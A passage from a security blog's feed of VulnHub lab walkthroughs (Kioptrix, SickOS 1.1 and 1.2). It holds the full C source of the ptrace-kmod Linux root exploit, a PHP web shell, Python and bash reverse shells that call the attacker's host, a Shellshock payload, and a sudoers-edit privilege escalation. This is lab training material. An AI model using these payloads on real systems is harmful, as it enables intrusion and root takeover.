</span><span class='line'><span class="cm"> * Should work under all current 2.2.x and 2.4.x kernels.</span>
</span><span class='line'><span class="cm"> * </span>
</span><span class='line'><span class="cm"> * I discovered this stupid bug independently on January 25, 2003, that</span>
</span><span class='line'><span class="cm"> * is (almost) two month before it was fixed and published by Red Hat</span>
</span><span class='line'><span class="cm"> * and others.</span>
</span><span class='line'><span class="cm"> * </span>
</span><span class='line'><span class="cm"> * Wojciech Purczynski &lt;cliph@isec.pl&gt;</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*</span>
</span><span class='line'><span class="cm"> * IT IS PROVIDED &quot;AS IS&quot; AND WITHOUT ANY WARRANTY</span>
</span><span class='line'><span class="cm"> * </span>
</span><span class='line'><span class="cm"> * (c) 2003 Copyright by iSEC Security Research</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;grp.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;paths.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;signal.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/wait.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/param.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/ptrace.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/user.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">cliphcode</span><span class="p">[]</span> <span class="o">=</span>
</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x90\x90\xeb\x1f\xb8\xb6\x00\x00</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x00\x5b\x31\xc9\x89\xca\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="s">&quot;</span><span class="se">\xb8\x0f\x00\x00\x00\xb9\xed\x0d</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x00\x00\xcd\x80\x89\xd0\x89\xd3</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x40\xcd\x80\xe8\xdc\xff\xff\xff</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define CODE_SIZE (sizeof(cliphcode) - 1)</span>
</span><span class='line'>
</span><span class='line'><span class="kt">pid_t</span> <span class="n">parent</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="kt">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="kt">pid_t</span> <span class="n">victim</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="k">volatile</span> <span class="kt">int</span> <span class="n">gotchild</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">fatal</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">kill</span><span class="p">(</span><span class="n">parent</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">kill</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">kill</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">putcode</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span> <span class="n">dst</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">MAXPATHLEN</span> <span class="o">+</span> <span class="n">CODE_SIZE</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span> <span class="n">src</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">cliphcode</span><span class="p">,</span> <span class="n">CODE_SIZE</span><span class="p">);</span>
</span><span class='line'>  <span class="n">len</span> <span class="o">=</span> <span class="n">readlink</span><span class="p">(</span><span class="s">&quot;/proc/self/exe&quot;</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">CODE_SIZE</span><span class="p">,</span> <span class="n">MAXPATHLEN</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to read /proc/self/exe&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">len</span> <span class="o">+=</span> <span class="n">CODE_SIZE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">dst</span><span class="o">++</span><span class="p">,</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>          <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to write shellcode&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">sigchld</span><span class="p">(</span><span class="kt">int</span> <span class="n">signo</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">gotchild</span><span class="o">++</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Signal caught</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to read registers&quot;</span><span class="p">);</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Shellcode placed at 0x%08lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">eip</span><span class="p">);</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">putcode</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">eip</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Now wait for suid shell...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to detach from victim&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">sigalrm</span><span class="p">(</span><span class="kt">int</span> <span class="n">signo</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">errno</span> <span class="o">=</span> <span class="n">ECANCELED</span><span class="p">;</span>
</span><span class='line'>  <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Fatal error&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">do_child</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">child</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">victim</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">signal</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">sigchld</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">do</span>
</span><span class='line'>      <span class="n">err</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">errno</span> <span class="o">==</span> <span class="n">ESRCH</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to attach&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Attached to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">gotchild</span><span class="p">)</span> <span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to setup syscall trace&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Waiting for signal</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(;;);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">do_parent</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">progname</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
</span><span class='line'>  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">socket</span><span class="p">(</span><span class="n">AF_SECURITY</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span> <span class="o">=</span> <span class="n">stat</span><span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_ISUID</span><span class="p">)</span> <span class="o">!=</span> <span class="n">S_ISUID</span><span class="p">);</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to stat myself&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">alarm</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">progname</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">prepare</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">initgroups</span><span class="p">(</span><span class="s">&quot;root&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>      <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>      <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>      <span class="n">execl</span><span class="p">(</span><span class="n">_PATH_BSHELL</span><span class="p">,</span> <span class="n">_PATH_BSHELL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to spawn shell&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">prepare</span><span class="p">();</span>
</span><span class='line'>  <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">sigalrm</span><span class="p">);</span>
</span><span class='line'>  <span class="n">alarm</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">parent</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
</span><span class='line'>  <span class="n">victim</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to fork&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">do_child</span><span class="p">();</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>      <span class="n">do_parent</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>in target vm /tmp:</p>

<p><code>wget http://192.168.79.173/ptrace-kmod.c</code></p>

<p>&lsquo;gcc ptrace-kmod.c -o attack&rsquo;</p>

<p>run attack:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sickos1.2]]></title>
    <link href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/"/>
    <updated>2016-05-31T13:08:16-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2</id>
    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Wfuzz</li>
<li>Curl</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.180 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>

<p>Looks like port 22 and port 80 are openning.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Check the <a href="http://192.168.79.180">http://192.168.79.180</a></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Not excited.</p>

<p>use Nikto:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Still nothing cool</p>

<p>try wfuzz:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.180/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p>find a test dir:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>next exam the HTTP options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl -v -X OPTIONS http://192.168.79.180/test/</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it supports PUT.</p>

<p>Now upload php reverse shell (I tried different ports, looks like only 443 port works):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p80 192.168.79.180 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>now the shell is uploaded:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>get the reverse shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>A better php shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;exec&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Upload this shell, and in brower:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">http</span><span class="o">://</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">79.180</span><span class="o">/</span><span class="nx">test</span><span class="o">/</span><span class="nb">exec</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nb">exec</span><span class="o">=</span><span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.79.173&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>get the shell.</p>

<p>During enumeration step, I follow <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a></p>

<p><code>ls -l /etc/cron.daily</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>After enumeration, find the system has chkrootkit:</p>

<p><code>dpkg -l | grep chkrootkit</code></p>

<p>chkrootkit verions is 0.49 and it is vulnerable.</p>

<p><code>searchsploit chkrootkit</code></p>

<p><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</code></p>

<p>also need to change the privilages on the update file with chmod 777 and wait:</p>

<p><code>ls -al /etc/sudoers</code></p>

<p>try:</p>

<p><code>sudo su</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos1.2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sickos:1.1]]></title>
    <link href="http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1/"/>
    <updated>2016-05-18T12:50:37-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Metasploit</li>
<li>FoxyProxy</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.178 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.178 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like port 22 and port 3218 are openning. Port 3218 is running Squid. open msfconsole, search squid. I found that:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Then use this module to scan the squid service:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like port 80 is opened:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Use FoxyProxy add-on to configure proxy:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>now visit <a href="http://192.168.79.178">http://192.168.79.178</a></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>now let&rsquo;s use nikto to scan the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h localhost -useproxy http://192.168.79.178:3128</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like there is a shellshock vuln</p>

<p>Let&rsquo;s test it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>It works and looks  there is an account sickos.</p>

<p>Now lets setup reverse shell.</p>

<p>netcat-style shell access without netcat:</p>

<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>

<p>in one terminal:</p>

<p><code>nc -nlvp 4444</code></p>

<p>in another terminal:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.79.173/4444 0&lt;&1" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
</span></code></pre></td></tr></table></div></figure>


<p>get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>After Enumeration, got a interesting file: <code>/var/www/wolfcms/config.php</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like the password is <code>john@123</code></p>

<p>SSH to the target server as sickos and use this password:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Check sickos&rsquo;s privilege:</p>

<p><code>sudo -l</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it can run as root</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/sickos/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>YES</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Csharp: VulnJson]]></title>
    <link href="http://wg135.github.io/blog/2016/05/05/csharp-vulnjson/"/>
    <updated>2016-05-05T15:44:32-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/05/csharp-vulnjson</id>
